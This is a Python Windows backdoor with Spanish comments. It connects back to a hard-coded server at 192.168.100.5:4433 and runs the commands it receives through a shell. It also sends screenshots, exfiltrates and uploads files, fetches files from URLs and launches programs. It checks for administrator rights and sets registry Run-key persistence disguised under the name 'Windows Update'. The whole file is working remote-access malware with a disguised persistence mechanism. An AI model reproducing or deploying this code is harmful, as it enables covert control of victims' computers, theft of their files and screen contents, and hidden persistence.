'''
Resumen: Este script es un backdoor que se conecta a un servidor remoto y ejecuta comandos en el sistema.
El servidor puede enviar comandos al backdoor y recibir la salida de los comandos.
El backdoor también puede enviar capturas de pantalla al servidor.

El servidor debe ejecutar el script .py para recibir las conexiones del backdoor.'''


import socket
import subprocess
import sys
import signal
import struct
import os
import winreg

import requests
import mss
import time

current_dir = os.getcwd()

# Manejador de señales para cerrar el programa
def signal_handler(sig, frame):
    print("\n[!] Exiting...")
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)

def run_command(command):
    ''' 
    Ejecuta un comando en el sistema y devuelve la salida
    '''
    print(f"Running command: {command}")
    try:
        # Ejecutamos el comando y guardamos la salida
        output = subprocess.check_output(command, shell=True)
    except Exception as e:
        # Si hay un error, lo guardamos
        output = str(e)
        # Si hay un error, devolvemos un mensaje de error
        
        return b'[-] Error running command  \n' + output.encode()
    return output


def send_screenshot(client_socket):
    '''
    Enviar una captura de pantalla al servidor
    '''
    with open("c:\\temp\\capture.png", "rb") as file:
        screenshot_data = file.read()
    
    # Enviar primero el tamaño del archivo
    client_socket.send(struct.pack("!I", len(screenshot_data)))
    
    # Enviar los datos del archivo
    client_socket.sendall(screenshot_data)
    
    
def take_screenshot(client_socket):
    '''
    Función para tomar una captura de pantalla
    '''
    screen = mss.mss()
    screen.shot()

    with open("monitor-1.png", "rb") as file:
        screenshot_data = file.read()
        
    # Enviar primero el tamaño del archivo
    client_socket.send(struct.pack("!I", len(screenshot_data)))
    client_socket.sendall(screenshot_data)
    os.remove("monitor-1.png")  
    
    
def download_file(client_socket, file_path):
    '''
    Función para descargar un archivo y enviarlo al servidor
    '''
    # verifica si el archivo existe
    if not os.path.exists(file_path):
        # Enviamos primero el tamaño del mensaje de error
        error_msg = b"[-] File not found"
        client_socket.send(struct.pack("!I", len(error_msg)))
        client_socket.send(error_msg)
        return False
        
    try:
        with open(file_path, "rb") as file_download:
            data = file_download.read()
            # Enviamos primero el tamaño del archivo
            client_socket.send(struct.pack("!I", len(data)))
            # Enviamos el contenido
            client_socket.sendall(data)            
        print(f"File {file_path} sent successfully!")
    except Exception as e:
        error_msg = f"Error downloading file: {e}".encode()
        client_socket.send(struct.pack("!I", len(error_msg)))
        client_socket.send(error_msg)
        print(f"Error downloading file: {e}")


def upload_file(client_socket, file_path):
    '''
    Función para recibir un archivo del servidor y guardarlo localmente
    '''
    try:
        with open(file_path, "wb") as file_upload:
            data = client_socket.recv(30000)
            file_upload.write(data)
        print(f"File {file_path} received successfully!")
    except Exception as e:
        print(f"Error uploading file: {e}")

def download_internet_file(url):
    '''
    Función para descargar un archivo de internet
    '''
    try:
        consulta = requests.get(url)
        name_file = url.split("/")[-1]
        with open(name_file, "wb") as file:
            file.write(consulta.content)
        print(f"File {name_file} downloaded successfully!")
    except Exception as e:
        print(f"Error downloading file: {e}")
        
def start_app(client_sockect,name_app):
    '''
    Función para iniciar una aplicación
    '''
    try:
        # Iniciar la aplicación en un proceso separado
        subprocess.Popen(name_app,shell=True)
        print(f"Application {name_app} started successfully!")
        client_socket.send(b"Application %s started successfully!" % name_app.encode())
    except Exception as e:
        print(f"Error starting application: {e}")

def reconectar(client_socket):
    '''
    Función para reconectar al servidor indefinidamente
    cada 5 segundos hasta lograr la conexión
    '''
    server_ip = '192.168.100.5'  # IP del servidor
    server_port = 4433           # Puerto del servidor
    
    while True:
        try:
            print("[*] Intentando conectar al servidor...")
            client_socket.connect((server_ip, server_port))
            print("[+] Conexión establecida con éxito")
            return True
            
        except Exception as e:
            print(f"[-] Error al conectar: {e}")
            print("[*] Reintentando en 5 segundos...")
            time.sleep(5)
            continue
        
def check_admin(client_socket):
    '''
    Función para verificar si el script se está ejecutando como administrador
    '''
    try:
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if is_admin == 0:
            message = "[-] No se está ejecutando como administrador"
            print(message)
            client_socket.send(message.encode())
            
        else:
            message = "[+] Ejecutando como administrador"
            print(message)
            client_socket.send(message.encode())
    except Exception as e:
        error_msg = f"[-] Error checking admin: {e}"
        print(error_msg)
        client_socket.send(error_msg.encode())
        
def create_register_persistence():
    '''
    Función para crear una clave de registro para la persistencia
    '''
    try:
        # Abrir la clave de registro
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_READ)
        value, regtype = winreg.QueryValueEx(key, "Windows Update")
        winreg.CloseKey(key)
        if value == sys.argv[0]:
            print("[+] Persistence already exists.")
            return
    except FileNotFoundError:
        pass  # La clave no existe, proceder a crearla

    try:
        # Crear la clave de registro
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "Windows Update", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(key)
        print("[+] Persistence created successfully!")
    except Exception as e:
        print(f"[-] Error creating persistence: {e}")
        
        
        
if __name__ == '__main__':
    

    
    while True:
        
        # Crear persistencia en el registro
        create_register_persistence()
        try:
            # Creamos un nuevo socket
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Intentamos reconectar usando la función
            if reconectar(client_socket):
                # Enviamos el directorio actual
                client_socket.send(current_dir.encode())
                
                # Bucle de comandos
                while True:
                    try:
                        command = client_socket.recv(2048).decode().strip()
                        
                        if command == "screenshot":
                            send_screenshot(client_socket)
                        
                        elif command.startswith("download "):
                            download_file(client_socket, command[9:])            
                        
                        elif command.startswith("upload "):
                            upload_file(client_socket, command[7:])
                        
                        elif command.startswith("start "):
                            start_app(client_socket, command[6:])
                        
                        elif command.startswith("geturl "):
                            download_internet_file(command[7:])
                        
                        elif command.startswith("screenshot2"):
                            take_screenshot(client_socket)
                        
                        elif command == "checkadmin":
                            check_admin(client_socket)
                        
                        elif command.startswith("cd "):
                            try:
                                os.chdir(command[3:])
                                pwd = os.getcwd()
                                client_socket.send(pwd.encode())
                            except:
                                client_socket.send(b'\n[-] Error changing directory\n')
                        else:
                            command_output = run_command(command).decode('cp850')
                            client_socket.send(b'\n' + command_output.encode() + b'\n')
                    
                    except:
                        print("[-] Conexión perdida")
                        break  # Sale al bucle principal para reconectar
                        
        except Exception as e:
            print(f"[-] Error: {e}")
        
        # Cerramos el socket antes de intentar reconectar
        try:
            client_socket.close()
        except:
            pass
    
        
            
    
            
 